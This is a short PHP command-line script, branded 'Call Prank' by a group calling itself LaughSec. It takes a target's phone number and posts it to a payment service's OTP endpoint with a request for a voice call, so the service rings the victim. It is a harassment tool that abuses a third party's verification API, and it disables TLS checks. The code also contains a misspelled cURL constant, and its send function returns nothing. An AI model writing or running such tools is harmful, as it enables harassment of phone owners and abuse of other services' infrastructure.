<?php
function send($phone){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"https://www.tokocash.com/oauth/otp");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);
curl_setopt($ch, CURLOPT_RETIRNTRANSFER,true);
curl_setopt($ch, CURLOPT_HEADER,true);
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"msisdn=$phone&accept=call");
$test = curl_exec($ch);
curl_close($ch);
echo $test."\n";
}
echo "-------------------------\n";
echo "| Created by Syahrul R. |\n";
echo "| Team : LaughSec       |\n";
echo "| Type : Call Prank     |\n";
echo "| Contact : 087878811138|\n";
echo "| Support by:           |\n";
echo "| -bocah-programmer.xyz |\n";
echo "| -LaughSec.blogspot.com|\n";
echo "-------------------------\n";
echo "Input target : ";
$no = trim(fgets(STDIN));
$execute = send($no);
print $execute;
?>
